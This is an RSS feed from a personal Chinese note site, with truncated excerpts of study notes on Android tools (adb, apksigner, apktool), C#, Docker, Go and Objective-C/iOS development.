<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Introduction on shesl-meow's note site</title><link>http://shesl-meow.github.io/</link><description>Recent content in Introduction on shesl-meow's note site</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><atom:link href="http://shesl-meow.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>Introduction</title><link>http://shesl-meow.github.io/docs/readme/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/readme/</guid><description>Introduction # 这里是 shesl 的笔记网站：
git-repo for note resources: Note git-repo for front pages: GitPages Repo front site: GitPages 关于我：
邮件：shesl-meow@qq.com</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/android/adb/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/android/adb/</guid><description>Android Debug Bridge(ADB) # Android Debug Bridge (adb) is a versatile command-line tool that lets you communicate with a device.
It is a client-server program that includes three components:
A client, which sends commands. The client runs on your development machine. You can invoke a client from a command-line terminal by issuing an adbcommand. A daemon (adbd), which runs commands on a device. The daemon runs as a background process on each device.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/android/apksigner/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/android/apksigner/</guid><description>学习途径：
官方命令行工具：https://developer.android.com/studio/command-line/apksigner apksigner # Usage # sign an apk # The syntax for signing an APK using the apksigner tool is as follows:
$ apksigner sign --ks keystore.jks [signer_options] app-name.apk # or $ apksigner sign --key key.pk8 --cert cert.x509.pem [signer_options] app-name.apk When you sign an APK using the apksigner tool, you must provide the signer&amp;rsquo;s private key and certificate. You can include this information in two different ways:</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/android/apktool/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/android/apktool/</guid><description>学习途径：
官网教程：https://ibotpeaches.github.io/Apktool/ apktool # Basic # First lets take a lesson into apk files. Apks are nothing more than a zip file containing resources and assembled java code. If you were to simply unzip an apk like so, you would be left with files such as classes.dex and resources.arsc.
$ unzip testapp.apk -d unzip-folder ... $ cd unzip-folder $ ls AndroidManifest.xml META-INF classes.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/c#/1.%E5%9F%BA%E6%9C%AC%E4%BB%8B%E7%BB%8D/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/c#/1.%E5%9F%BA%E6%9C%AC%E4%BB%8B%E7%BB%8D/</guid><description>C# 简介 # 通过菜鸟教程学习：
https://www.runoob.com/csharp/csharp-intro.html C# 提供的一些功能如下：
布尔条件（Boolean Conditions） 自动垃圾回收（Automatic Garbage Collection） 标准库（Standard Library） 组件版本（Assembly Versioning） 属性（Properties）和事件（Events） 委托（Delegates）和事件管理（Events Management） 易于使用的泛型（Generics） 索引器（Indexers） 条件编译（Conditional Compilation） 简单的多线程（Multithreading） LINQ 和 Lambda 表达式 集成 Windows</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/c#/2.%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/c#/2.%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</guid><description>基本语法 # 数据类型 # 在 C# 中，变量分为以下几种类型：值类型（Value types）、引用类型（Reference types）、指针类型（Pointer types）
值类型 # 值类型都是从类 System.ValueType 中派生的。值类型直接用来存储数据。
下面是常见的值类型：
类型 描述 范围 默认值 bool 布尔值 True 或 False False byte 8 位无符号整数 0 到 255 0 char 16 位 Unicode 字符 U +0000 到 U +ffff &amp;lsquo;\0&amp;rsquo; decimal 128 位精确的十进制值，28-29 有效位数 (-7.9 x 1028 到 7.9 x 1028) / 100 到 28 0.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/c#/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/c#/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B/</guid><description>参考文档：
https://docs.microsoft.com/zh-cn/dotnet/core/tools/dotnet-restore
https://docs.microsoft.com/zh-cn/dotnet/core/tools/dotnet-msbuild
从零开始 # 如何从零开始，使用命令行构建并运行一个 C# 的项目，并且运行一个程序？
项目结构 # 运行一个项目至少需要一个 xml 格式的项目文件 {项目名}.csproj 和一个源代码文件 {文件名}.cs。了解这个，有助于我们使用 git 管理自己的项目代码。
我们在 Visual Studio 里面创建一个 .Net 在 Windows 上的桌面控制台应用。
下面是官方默认生成的 HelloWorld.csproj：
&amp;lt;Project Sdk=&amp;#34;Microsoft.NET.Sdk&amp;#34;&amp;gt; &amp;lt;PropertyGroup&amp;gt; &amp;lt;OutputType&amp;gt;Exe&amp;lt;/OutputType&amp;gt; &amp;lt;TargetFramework&amp;gt;netcoreapp3.1&amp;lt;/TargetFramework&amp;gt; &amp;lt;/PropertyGroup&amp;gt; &amp;lt;/Project&amp;gt; 这个是项目的配置信息 上面这个 xml 指明了项目使用的 SDK（Microsoft.NET.Sdk）、输出的文件类型（可执行 exe 文件）、.NET 版本。 下面是官方默认生成的 Program.cs：
using System; namespace HelloWorld { class Program { static void Main() { Console.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/docker/1.orientation/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/docker/1.orientation/</guid><description>Part 1: Orientation and setup # Docker 概念 # What is docker? # Docker is a platform for developers and sysadmins to develop, deploy, and run applications with containers. The use of Linux containers to deploy applications is called containerization.
Containerization is increasingly popular because containers are:
Flexible, Lightweight, Interchangeable, Portable, Scalable, Stackable Images and Containers # Image：包含所有运行一个程序所需环境的可执行包。比如：其中的代码，库文件，环境变量，配置文件等等。一个 container 通过运行一个 image 启动。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/docker/2.containers/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/docker/2.containers/</guid><description>Part 2: Containers # We start at the bottom of the hierarchy of such an app, which is a container, which we cover on this page.
新的开发环境 Container # In the past, if you were to start writing a Python app, your first order of business was to install a Python runtime onto your machine. But, that creates a situation where the environment on your machine needs to be perfect for your app to run as expected, and also needs to match your production environment.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/docker/3.services/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/docker/3.services/</guid><description>Part 3: Services # 关于 Services # In a distributed application, different pieces of the app are called “services”. For example, if you imagine a video sharing site, it probably includes a service for storing application data in a database, a service for video transcoding in the background after a user uploads something, a service for the front-end, and so on.
Services are really just “containers in production.” A service only runs one image, but it codifies the way that image runs—what ports it should use, how many replicas of the container should run so the service has the capacity it needs, and so on.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/golang/draveness/%E5%B8%B8%E7%94%A8%E5%85%B3%E9%94%AE%E5%AD%97/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/golang/draveness/%E5%B8%B8%E7%94%A8%E5%85%B3%E9%94%AE%E5%AD%97/</guid><description>常用关键字 # defer # 实例 # 下面是一个使用 defer 的实例：
func createPost(db *gorm.DB) error { tx := db.Begin() defer tx.Rollback() if err := tx.Create(&amp;amp;Post{Author: &amp;#34;Draveness&amp;#34;}).Error; err != nil { return err } return tx.Commit().Error } 可见它的用法是：defer 之后指定的语句，会在整个函数执行结束的时候执行。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/golang/gomodules/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/golang/gomodules/</guid><description>参考资料：https://mp.weixin.qq.com/s/zo7zmEVXvxgr80n6H_49Mg
Go Modules # 什么是 Go Modules？
Golang 的依赖库解决方案，于 Go1.14 推荐在生产环境上使用； 关于 GOPATH # GOPATH 是一个 golang 的语言环境变量，输入以下命令，可以查看本机的值：
$ go env GOPATH 指向一个绝对路径，这个路径下，应该有 bin/、pkg/、src/ 三个文件夹。
在 GOPATH 模式下：
应用的代码应该存放在固定的目录 $GOPATH/src 下； 如果执行 go get 拉取外部的依赖，会将其自动下载并安装到 $GOPATH 目录下； GOPATH 模式的致命缺陷：没有版本控制的概念。
在 GOPATH 模式下诞生了许多依赖解决方案：vendor 目录模式，依赖工具 dep，Go 1.11 释放出 Go Modules 前身 vgo。
基本使用 # 在 Go modules 中，我们能够使用如下命令进行操作：
命令 作用 go mod init 生成 go.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/golang/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/golang/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/</guid><description>Golang GC # 常见 GC 算法 # 名称 描述 优点 缺点 引用计数 根据对象自身的引用计数来回收，当引用计数归零时进行回收。 简单直接，回收速度快 需要额外的空间存放计数；
需要频繁更新计数；
无法处理循环引用的情况； 标记清除 标记出所有不需要回收的对象，在标记完成后统一回收掉所有未被标记的对象。 简单直接，速度快 会造成不连续的内存空间（内存碎片）
不适合回收对象过多的场景 复制法 将内存分为大小相同的两块，每次使用其中的一块，当这一块的内存使用完后，将还存活的对象复制到另一块去，然后再把使用的空间一次清理掉 解决了内存碎片的问题 每次清除针对的都是整块内存，效率低于标记清除法；
有部分内存总是利用不到，资源浪费，移动存活对象比较耗时，并且如果存活对象较多的时候，需要担保机制确保复制区有足够的空间可完成复制； 标记整理 标记过程同标记清除法，结束后将存活对象压缩至一端，然后清除边界外的内容。 解决了内存碎片的问题，也不像标记复制法那样需要担保机制，存活对象较多的场景也使适用； 性能低，因为在移动对象的时候不仅需要移动对象还要维护对象的引用地址，可能需要对内存经过几次扫描才能完成； 分代式 将对象根据存活时间的长短进行分类，存活时间小于某个值的为“年轻代”，存活时间大于某个值的为“老年代”，永远不会参与回收的对象为“永久代”。并根据分代假设（如果一个对象存活时间不长则倾向于被回收，如果一个对象已经存活很长时间则倾向于存活更长时间）对对象进行回收。 STW 对用户代码影响大 Golang GC # Golang 使用的垃圾清理算法是“无分代”、“不整理”、“与用户代码并发执行”的三色标记清理算法。
为什么 Golang 不使用“顺序内存分配器”？
Go 运行时的分配算法基于 tcmalloc，基本上没有碎片问题，对对象进行整理不会带来实质性的性能提升。 并且顺序内存分配器在多线程的场景下并不适用。 为什么 Golang 不使用“分代假设”？</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/golang/%E8%8F%9C%E9%B8%9F%E6%95%99%E7%A8%8B/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/golang/%E8%8F%9C%E9%B8%9F%E6%95%99%E7%A8%8B/</guid><description>菜鸟教程 # 语言教程 # 计算机软件经历了数十年的发展，形成了多种学术流派，有面向过程编程、面向对象编程、函数式编程、面向消息编程等，这些思想究竟孰优孰劣，众说纷纭。
除了 OOP 外，近年出现了一些小众的编程哲学，Go 语言对这些思想亦有所吸收。例如，Go 语言接受了函数式编程的一些想法，支持匿名函数与闭包。再如，Go语言接受了以 Erlang 语言为代表的面向消息编程思想，支持 goroutine 和通道，并推荐使用消息而不是共享内存来进行并发编程。总体来说，Go 语言是一个非常现代化的语言，精小但非常强大。
Go 语言最主要的特性：
自动垃圾回收 更丰富的内置类型 函数多返回值 错误处理 匿名函数和闭包 类型和接口 并发编程 反射 语言交互性 语法基础 # 仅仅列举一些值得注意的语法。
数据类型 # 使用 fmt.Sprintf 格式化字符串并赋值给新串：
fmt.Sprintf(&amp;#34;Code=%d&amp;amp;endDate=%s&amp;#34;, 123, &amp;#34;2020-12-31&amp;#34;); Go 中按类别大约有以下几种数据类型：
”布尔型“、“数字型”、“字符串型”、“派生类型”； 其中“派生类型”有以下几种：指针类型、数组类型、struct 类型、channel 类型、函数类型、切片类型、interface 类型、Map 类型； 变量 # 变量声明有以下几种方式：
// 一次声明多个变量 var identifier type // 根据值自行判定变量类型。 var v_name = value // 省略 var，使用 := 定义。左侧如果没有声明新的变量，就产生编译错误 v_name := value 声明多变量的方式：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/objective-csdk/1.%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/objective-csdk/1.%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</guid><description>基本语法 # 基本类型 # 布尔型 # 布尔型主要有两种使用方式：
BOOL v1 = YES; // 常用的布尔型使用方式，两个取值分别是 YES, NO bool v2 = false; // 两个取值分别是 true, false 上面的两种方式不是等价的，前者是通过下面的方式实现的：
#if (TARGET_OS_IPHONE &amp;amp;&amp;amp; __LP64__) || TARGET_OS_WATCH #define OBJC_BOOL_IS_BOOL 1 typedef bool BOOL; #else #define OBJC_BOOL_IS_CHAR 1 typedef unsigned char BOOL; #endif 整数型 # 除了 C 中实现的整数和无符号整数，OC 同样也实现了两个整数类型：
NSInteger v1 = 8; NSUInteger v2 = 9; // 无符号和有符号都是：32 位类型为 int, 64 位类型为 long 同样也可以看看他们的实现方式：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/objective-csdk/10.%E6%95%B0%E7%BB%84%E4%B8%8E%E5%AD%97%E5%85%B8/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/objective-csdk/10.%E6%95%B0%E7%BB%84%E4%B8%8E%E5%AD%97%E5%85%B8/</guid><description>参考：https://github.com/ming1016/study/wiki/iOS基础集合类
数组与字典 # NSArray/NSMutableArray # 基本使用 # 定义、初始化一个 NSArray，可以用以下的方式：
// NSArray: @[] NSArray *instructors = @[ @&amp;#34;Joe&amp;#34;, @&amp;#34;Tim&amp;#34;, @&amp;#34;Jim&amp;#34;, @&amp;#34;Tom&amp;#34;, @&amp;#34;Mark&amp;#34; ]; // NSArray: arrayWithObjects/initWithObjects NSArray *instructors = [NSArray arrayWithObjects:@&amp;#34;Joe&amp;#34;, @&amp;#34;Tim&amp;#34;, @&amp;#34;Jim&amp;#34;, @&amp;#34;Tom&amp;#34;, @&amp;#34;Mark&amp;#34;, nil]; NSArray *instructors = [[NSArray alloc] initWithObjects:@&amp;#34;Joe&amp;#34;, @&amp;#34;Tim&amp;#34;, @&amp;#34;Jim&amp;#34;, @&amp;#34;Tom&amp;#34;, @&amp;#34;Mark&amp;#34;, nil]; 定义、初始化一个 NSMutableArray，可以用以下的方式：
// NSMutableArray: copy from NSArray NSArray *instructors = @[ @&amp;#34;Joe&amp;#34;, @&amp;#34;Tim&amp;#34;, @&amp;#34;Jim&amp;#34;, @&amp;#34;Tom&amp;#34;, @&amp;#34;Mark&amp;#34; ]; NSMutableArray *mInstructors = [instructors mutableCopy]; // NSMutableArray: array with array NSMutableArray *mInstructors = [NSMutableArray arrayWithArray:@[ @&amp;#34;Joe&amp;#34;, @&amp;#34;Tim&amp;#34;, @&amp;#34;Jim&amp;#34;, @&amp;#34;Tom&amp;#34;, @&amp;#34;Mark&amp;#34; ] ]; // NSMutableArray: 下面三种初始化空Array的方式是等价的，建议的方法是第一种 NSMutableArray *mEmpty = [[NSMutableArray alloc] init]; NSMutableArray *mEmpty = [NSMutableArray new]; NSMutableArray *mEmpty = [NSMutableArray array]; 另外还有常用的函数 removeObject: / removeObject:atIndex: / insertObject: / insertObject:atIndex: / replaceObjectAtIndex:withObject: 等，不举例了。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/objective-csdk/11.runloop/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/objective-csdk/11.runloop/</guid><description> 参考：
https://stackoverflow.com/questions/7222449/nsdefaultrunloopmode-vs-nsrunloopcommonmodes https://hit-alibaba.github.io/interview/iOS/ObjC-Basic/Runloop.html https://blog.ibireme.com/2015/05/18/runloop/ 官方文档：
https://developer.apple.com/documentation/foundation/nsrunloop?language=objc</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/objective-csdk/2.%E7%B1%BB/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/objective-csdk/2.%E7%B1%BB/</guid><description>类 # 概述 # Objective-C 主要有以下三种文件类型：
扩展名 内容类型 .h 头文件。头文件包含类，类型，函数和常数的声明。 .m 源代码文件。这是典型的源代码文件扩展名，可以包含 Objective-C 和 C 代码。 .mm 源代码文件。带有这种扩展名的源代码文件，还可以包含 C++ 代码。
仅在你的 Objective-C 代码中确实需要使用 C++ 类或者特性的时候才用这种扩展名。 新建类文件，在 xcode 中使用快捷键 command + N。可见它创建了一下的两个文件：
// Person.h #import &amp;lt;Foundation/Foundation.h&amp;gt; NS_ASSUME_NONNULL_BEGIN @interface Person : NSObject @end NS_ASSUME_NONNULL_END // Person.m #import &amp;#34;Person.h&amp;#34; @implementation Person @end 下面由这两个文件，展开介绍一下 OC 的内容：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/objective-csdk/3.%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/objective-csdk/3.%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</guid><description>内存管理 # 概述 # 三种主要的内存管理方式：
显示内存释放：C 中的 free、C++ 中的 delete； 基于引用计数：C++ 中的智能指针（smart pointer），Objective-C 中使用的方式； 垃圾回收机制：Java、JavaScript、C#； OS X (macOS) 过去支持垃圾回收，现在已经废除了。iOS 则一直不支持垃圾回收。
引用计数 # iOS 支持 MRC (Mannul Reference Counting) 手动引用计数与 ARC (Automatic Reference Counting) 自动引用计数两种管理机制。
MRC # 手动引用计数主要有以下的几个相关的操作：
生成（分配一个对象，并且引用计数置为 1）：alloc、cpoy、new； 持有（将一个对象的引用计数自增 1）：retain； 释放（将一个对象的引用计数自减 1）：release、autorelease； 废弃（释放一个对象，引用计数降为 0 应该废弃）：dealloc； 显示（显示一个对象的引用计数）：retainCount。 为什么要引入 autorelease？
在初始化一个对象的时候自动指明，如果对象的引用计数降为 0，则自动释放这个对象。
比如在未使用 autorelease 的时候一个代码可能是这么写的：
- (People *)createPeople { People *people = [[People alloc] init]; people.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/objective-csdk/4.%E5%9D%97/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/objective-csdk/4.%E5%9D%97/</guid><description>块 # 概念 # 什么是 Blocks？
Blocks 是对 C 语言的扩展，也就是带有局部变量的匿名函数； 它的好处是是使得 Objective-C 可以像 JavaScript 一样进行函数式编程； Blocks 的一些特点：
块可接受参数，也可返回值。 块可以分配在栈或堆上，也可以是全局的，分配在栈上的块可拷贝到堆里。 和标准的 Objective-C 对象一样，具备引用计数了。 定义块 # 定义一个块对象基础的语法是：
^{ // Block implementation here };  很显然这是一个匿名函数，就像 JavaScript 一样，也可以像下面一样直接执行：
^{ // Block implementation here }(); 但是通常我们定义一个 Blocks 时，通常是需要一个名字的：
void (^someBlock)() = ^{ // Block implementation here }; 这样定义的块可以通过像 C 中的语法一样调用：someBlock()
常见问题 # 块的强大之处是：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/objective-csdk/5.%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/objective-csdk/5.%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F/</guid><description>通信方式 # Delegate # delegate 是委托模式，委托模式是将一件属于委托者做的事情，交给另外一个被委托者来处理。
一个标准的委托由以下的部分组成：
@protocol FeederDelegate &amp;lt;NSObject&amp;gt; - (void)feed; @end @interface People : NSObject&amp;lt;FeederDelegate&amp;gt; @end @interface Dog : NSObject @property(nonatomic, weak) id&amp;lt;FeederDelegate&amp;gt; delegate; @end 也就是说，People 是一个必须要满足 Feeder 这个协议的模型，那么它必须实现一个 feed 函数。在 Dog 这个对象创建的时候可以将其 delegate 成员：
- (People *)createPeople { People *people = [[People alloc] init]; Dog *dog = [[Dog alloc] init]; dog.delegate = people; // 赋值 delegate 属性 people.dog = dog; return people; } 比如我们需要捕获对于一个按钮相应的动作事件，我们可以通过下面的两步完成：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/objective-csdk/6.%E5%A4%9A%E7%BA%BF%E7%A8%8B/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/objective-csdk/6.%E5%A4%9A%E7%BA%BF%E7%A8%8B/</guid><description>多线程 # iOS 线程概述 # 主线程：
iOS App 运行后，默认会开启 1 条线程，称为“主线程”或“UI线程” 主线程处理 UI 事件（比如点、滑动、拖拽等等）和显示、刷新 UI 界面 iOS 的线程相关技术主要有以下四种：
技术方案 特点 语言 线程生命周期 pthread 一套通用的多线程 API
适用于 Unix/Linux/Windows 系统
跨平台、可移植、使用难度大 C 程序员管理 NSThread 使用面向对象编程
简单易用，可以直接操作线程对象 Objective-C 程序员管理 GCD 旨在替代前面两种的线程技术
充分利用设备的多核特性 C 自动管理 NSOperation 基于 GCD，加入一些简单实用的功能
内容更加面向对象 Objective-C 自动管理 多线程的优缺点：
优点是很显然的：能适当提升程序的执行效率；能适当提升资源利用率（CPU、内存等） 缺点： 创建线程是有开销的，比如 iOS 的开销主要有（内核数据结构大约 1KB，栈空间，创建时间 90ms） 如果开启大量的线程，会降低程序的性能、增加 CPU 在线程调度上的开销、程序设计更加复杂。 NSThread # 什么是 NSThread？</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/objective-csdk/7.%E7%AE%80%E5%8D%95ui/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/objective-csdk/7.%E7%AE%80%E5%8D%95ui/</guid><description>简单 UI # iOS App # 官方文档：
https://developer.apple.com/documentation/uikit/app_and_environment/managing_your_app_s_life_cycle 一个参考了一个有趣的博客：
https://medium.com/@theiOSzone/briefly-about-the-ios-application-lifecycle-92f0c830b754 一个 iOS 的声明周期中会有以下的五种状态，下图列举官网中对这五种状态之间切换的示例：
这些声明周期的转换中也有一些相关的 HOOK 函数，那下图这个流程中的编号举例子：
这个变换流程中，有两个声明周期函数：
willFinishLaunchingWithOptions：如果你的程序启动成功的话，这个是整个应用第一次执行的代码； didFinishLaunchingWithOptions：在屏幕上即将显示任何画面之前执行的函数； 在程序进入 Active 状态之后，会执行：applicationDidBecomeActive；
applicationWillResignActive：当用户点击了 Home 键或者启动了其他应用程序之后，会执行这个函数；与此同时，系统还会发出一个信号 UIApplicationWillResignActiveNotification。
applicationDidEnterBackground：在上面的一个流程之后，程序会从 Inactive 状态进入 Background 状态，同时触发这个 hook 函数；
applicationWIllEnterForeground：如果应用程序在被操作系统杀死之前，再次被打开进入 Foregound，则会触发这个 hook 函数；
Backgound -&amp;gt; Suspended；
Suspended -&amp;gt; Backgound；
如果应用进入后台后 5s 不执行任何计算任务，操作系统则会把它置为暂停状态；相反则会回到后台状态。那是这两个状态之间的切换对程序员是透明的，也就是说无法 HOOK 到这两个状态的切换。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/objective-csdk/8.%E5%A4%8D%E6%9D%82ui/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/objective-csdk/8.%E5%A4%8D%E6%9D%82ui/</guid><description>参考：
https://developer.apple.com/documentation/uikit/view_controllers?language=objc https://medium.com/@felicity.johnson.mail/pushing-popping-dismissing-viewcontrollers-a30e98731df5 复杂 UI &amp;amp;&amp;amp; 多视图 # MVC 设计模式 # MVC 是一种设计模式。我们创建的对象根据其职责来划分，它要么属于 M:Model，要么属于 V:View，要么属于C:Controller，下面我们分别简要介绍一下 Model、View、ViewController。
Model # Model 一般是我们对真实世界中一些事物的抽象，来定义的一些数据对象，它包含我们所需要的数据以及对这些数据的操作。
Model 一般是负责定义及存储数据，是与用户界面上用于显示的各个视觉元素是无关的。
